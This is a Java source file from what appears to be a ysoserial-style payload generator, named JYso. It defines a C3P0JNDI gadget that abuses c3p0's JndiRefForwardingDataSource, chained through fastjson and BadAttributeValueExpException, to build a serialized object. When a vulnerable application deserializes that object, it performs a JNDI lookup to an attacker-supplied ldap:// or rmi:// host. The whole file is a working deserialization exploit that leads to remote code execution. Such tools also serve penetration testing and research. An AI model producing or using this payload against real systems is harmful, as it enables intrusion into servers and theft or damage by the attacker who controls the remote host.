package com.qi4l.JYso.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.alibaba.fastjson:com.alibaba.fastjson1.X"})
@Authors({Authors.UNAM4})
public class C3P0JNDI implements  ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        if (command.toLowerCase().startsWith("jndi:")) {
            command = command.substring(5);
        }

        if (!command.toLowerCase().startsWith("ldap://") && !command.toLowerCase().startsWith("rmi://")) {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }

        Object o = Reflections.createWithoutConstructor("com.mchange.v2.c3p0.JndiRefForwardingDataSource");
        Reflections.setFieldValue(o,"jndiName",command);
        Reflections.setFieldValue(o,"identityToken","exp");
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o);

        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(o, val);
        return hashMap;
    }
}
